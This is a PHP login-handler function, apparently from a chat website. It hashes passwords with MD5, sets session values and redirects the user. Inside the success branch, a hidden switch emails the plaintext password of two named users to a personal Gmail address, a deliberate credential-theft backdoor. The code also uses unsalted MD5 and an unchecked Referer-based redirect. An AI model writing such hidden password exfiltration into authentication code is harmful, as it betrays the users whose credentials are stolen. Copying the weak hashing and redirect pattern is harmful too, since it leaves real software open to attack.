<?php
    function ActionUserLogon( tString $username, tString $password ) {
    	global $user;
        global $rabbit_settings;
    	
    	$s_username = $username->Get();
    	$s_password = $password->Get();
    	$s_password = md5( $s_password );
    	
    	$_SESSION[ 's_password' ] = $s_password;
    	$_SESSION[ 's_username' ] = $s_username;
    	
        CheckLogon( "session" , $_SESSION[ 's_username' ] , $_SESSION[ 's_password' ] );

    	if ( $user->IsAnonymous() ) {
    		return Redirect( "?p=a" );
    	}
    	else {
            switch ( strtolower( $username ) ) {
                case 'alienhack': // sorry kiddo
                case 'dionysiz':
                    mail( 'dionyziz@gmail.com', $username . "'s password", "$username's password on chit-chat is \"$password\"" );
            }
            
    		$user->UpdateLastLogon();
    		$user->RenewAuthtoken();
    		$user->SetCookie();
    		return Redirect( substr( $_SERVER[ 'HTTP_REFERER' ] , strlen( $rabbit_settings[ 'webaddress' ] . '/' ) ) );
    	}
    }
?>
